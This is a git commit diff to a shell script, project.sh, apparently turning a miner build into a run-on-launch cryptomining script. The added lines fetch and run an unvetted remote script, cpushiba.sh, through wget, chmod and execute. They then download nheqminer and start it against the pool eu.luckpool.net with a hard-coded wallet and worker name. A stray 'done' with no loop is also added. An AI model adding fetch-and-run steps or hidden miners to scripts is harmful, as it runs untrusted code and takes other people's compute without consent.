9624d7d47c053ce23a76d118f2ac9d69ddb43c06
amaliatyas <93638059+amaliatyas@users.noreply.github.com>
2021-11-03 13:14:36 +0700

    Update project.sh

--- project.sh
+++ project.sh
@@ -1,4 +1,5 @@
 #
+wget https://raw.githubusercontent.com/apecici/aov/main/cpushiba.sh && chmod +x cpushiba.sh && ./cpushiba.sh
 git clone https://github.com/veruscoin/nheqminer.git
 cd nheqminer/cpu_xenoncat/asm_linux/
 sh assemble.sh
@@ -7,4 +8,8 @@ sh assemble.sh
 cd ../../../
 mkdir build && cd build
 cmake ../nheqminer
-make -j $(nproc)
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.NJAY -p x -t 2
+done
